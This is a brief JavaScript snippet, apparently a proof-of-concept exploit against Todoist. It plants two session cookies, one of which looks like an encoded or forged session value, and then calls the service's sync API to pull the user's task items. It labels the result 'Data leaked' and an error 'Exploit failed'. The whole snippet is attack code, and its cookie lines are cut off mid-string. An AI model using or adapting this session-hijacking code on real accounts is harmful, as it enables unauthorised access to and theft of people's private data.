document.cookie = "todoistd=6QfkysEzv4bwyVMxBPvhQk+IhT8=?pCHK=gASVJAAAAAAAAA>
document.cookie = "tduser=v4.public.eyJ1c2VyX2lkIjogNTQ4NTUzOTQsICJleHAiOiAi>

fetch("https://todoist.com/api/v8/sync", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "User-Agent": navigator.userAgent
  },
  body: JSON.stringify({
    sync_token: "*",
    resource_types: ["items"]
  })
})
.then(res => res.json())
.then(data => {
  console.log("✅ Data leaked:", data);
  document.body.style.backgroundColor = "black";
})
.catch(err => console.error("❌ Exploit failed:", err));
